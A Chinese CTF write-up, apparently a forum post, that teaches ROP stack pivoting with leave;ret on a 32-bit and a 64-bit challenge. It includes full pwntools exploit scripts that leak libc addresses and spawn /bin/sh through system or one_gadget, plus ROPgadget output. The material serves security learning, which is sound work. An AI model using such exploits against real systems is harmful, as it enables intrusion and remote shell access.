
```
#!usr/bin/python

from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

ip = "node3.buuoj.cn"
port = 29414
io = 0
elf = ELF("./spwn")
leave_ret = 0x08048511
bss_s = 0x0804A300
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
# print "main_addr = " +hex(main_addr)

def pwn(ip, port, debug):
    global io
    if(debug == 1):
        io = process("./spwn")
    else:
        io = remote(ip, port)

    io.recvuntil("name?")
    # payload = p32(puts_plt) + p32(main_addr) + p32(puts_got)
    payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    io.send(payload)

    io.recvuntil("say?")
    payload = "a" * 0x18 + p32(bss_s-4) + p32(leave_ret)
    io.send(payload)

    leak_addr = u32(io.recv(4))
    libc = LibcSearcher('write', leak_addr)
    # libc = LibcSearcher('puts', leak_addr)
    libc_base = leak_addr - libc.dump('write')
    # libc_base = leak_addr - libc.dump('puts')

    sys_addr = libc_base + libc.dump('system')

    io.recv()
    payload = p32(sys_addr) + p32(main_addr) + p32(bss_s+4*3) + "/bin/sh\x00"
    io.send(payload)
    io.recv()
    io.send("a" * 0x18 + p32(bss_s-4) + p32(leave_ret))
    io.interactive()

if __name__ == '__main__':
    pwn(ip, port, 0)
```

这里试验泄露`puts`不行，问了出题人，他说是因为`puts`很吃栈，导致stack跑到不可写区段了。

# 64位例题

[`easyR0p`](<https://bbs.kanxue.com/elink@121K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6x3k6h3g2t1j5h3#2A6L8X3N6Q4x3V1k6o6g2p5k6Q4x3X3c8D9k6h3q4J5L8W2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6W2j5i4y4&6f1U0m8H3i4K6u0r3k6h3q4K6P5g2t1H3M7l9.>)

与上题的溢出是一样的，但是这个题没有直接写入`bss`的变量，64位使用寄存器传参

```
easyr0p$ ROPgadget --binary easyR0p --only "pop|ret"

Gadgets information

============================================================

0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004007d0 : pop r14 ; pop r15 ; ret

0x00000000004007d2 : pop r15 ; ret

0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret

0x0000000000400625 : pop rbp ; ret

0x00000000004007d3 : pop rdi ; ret

0x00000000004007d1 : pop rsi ; pop r15 ; ret

0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

0x0000000000400559 : ret

0x0000000000400655 : ret 0xc148

Unique gadgets found: 12
```

我们在`ida`中可以找到调用`read()`的片段。数据x偏移 + `ebp` + `ret`可以溢出覆盖`ebp`的值，达到`read()`到`bss`的效果。

![](https://bbs.kanxue.com/upload/attach/202003/840734_MHRXZBKWTHCWH79.jpg)

可以使用`system("/bin/sh")`或者`one_gadget`

```
easyr0p$ one_gadget /lib/x86_64-linux-gnu/libc.so.6

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)

constraints:

  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)

constraints:

  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)

constraints:

  [rsp+0x70] == NULL
```

## exp

```
#!usr/bin/python

# -*- coding: UTF-8 -*-

from pwn import *

from LibcSearcher import *

context.log_level = 'debug'

ip = " "
port = 0
io = 0
elf = ELF("./easyR0p")
leave_ret = 0x000000000040071C
bss_start = 0x601100        # 0x0000000000601060
read = 0x00000000004006F5
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
read_got = elf.got['read']
pop_rdi = 0x00000000004007d3        # pop rdi ; ret
pop_rsi_r15 = 0x00000000004007d1        # pop rsi ; pop r15 ; ret
pop_rbp = 0x0000000000400625        # pop rbp ; ret
main_addr = elf.symbols['main']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def pwn(ip, port, debug):
    global io, one_gadget
    if(debug == 1):
        io = process("./easyR0p")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        io = remote(ip, port)
    payload = "a" * 0x40 + p64(bss_start+0x60+0x40) + p64(read)        # 向 bss_start+0x60 中写入
    io.sendafter('$', payload)
    payload  = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) 
    payload += p64(pop_rbp) + p64(bss_start+0x60+0x40) + p64(read)        # leave ret到这里时好继续read system
    payload += "b" * (0x40-len(payload))
    payload += p64(bss_start+0x60-8) + p64(leave_ret)
    io.send(payload)

    io.recvuntil('\x0a')
    io.recvuntil('\x0a')
    leak_addr = u64(io.recv(6).ljust(8, '\x00'))
    # leak_addr = u64(io.recv(6)[:-1].ljust(8, '\x00'))
    print "leak_addr = " +hex(leak_addr)
    libc_base = leak_addr - libc.sym['puts']
    '''
    sys_addr = libc_base + libc.sym['system']
    print "sys_addr = " +hex(sys_addr)
    binsh_addr = libc_base + libc.search("/bin/sh").next()
    '''
    one_gadget = libc_base + one_gadget[2]
    '''
    libc = LibcSearcher('puts', leak_addr)
    libc_base = leak_addr - libc.dump('puts')
    sys_addr = libc_base + libc.dump('system')
    binsh_addr = libc_base + libc.dump("str_bin_sh")
    payload = p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr)
    '''
    payload = p64(one_gadget)
    io.send(payload)
    io.interactive()

if __name__ == '__main__':
    pwn(ip, port, 1)
```

> 参考：
>
> 0c9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3I4W2k6g2)9#2k6X3S2S2L8g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3z5o6p5&6z5o6j5&6x3o6j5.
>
> 300K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4K9h3&6@1k6i4u0K6N6h3&6Q4x3X3g2K6M7r3q4U0k6g2)9J5c8U0t1H3x3e0k6Q4x3V1j5H3y4g2)9J5c8U0t1H3i4K6u0r3M7s2N6F1i4K6u0V1i4K6t1#2c8e0g2Q4x3U0f1^5y4g2)9J5y4f1t1K6i4K6t1#2c8e0c8Q4x3U0g2n7b7g2)9J5y4e0S2q4i4K6t1#2c8e0k6Q4x3U0g2m8x3q4)9J5y4e0R3^5i4K6t1#2c8e0N6Q4x3U0f1&6b7g2)9J5y4e0R3@1i4K6t1#2c8e0S2Q4x3U0g2n7c8W2)9J5y4e0R3I4i4K6t1#2c8e0N6Q4x3U0g2m8y4#2)9J5y4f1u0n7i4K6u0r3

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2020-3-7 11:06 被plkk编辑，原因：
